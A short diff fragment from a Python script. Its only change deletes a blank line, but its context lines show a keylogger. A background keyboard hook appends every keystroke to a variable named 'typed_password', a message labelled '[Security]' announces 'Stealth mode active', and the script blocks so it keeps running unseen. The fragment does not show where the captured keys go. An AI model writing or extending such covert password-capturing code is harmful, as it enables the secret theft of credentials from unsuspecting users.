@@ -59,7 +59,6 @@ def on_key(event):
         typed_password += event.name
 # Start background key listener
 keyboard.on_press(on_key)
-
 print("[Security] Stealth mode active...")
 keyboard.wait()  # keeps running
 
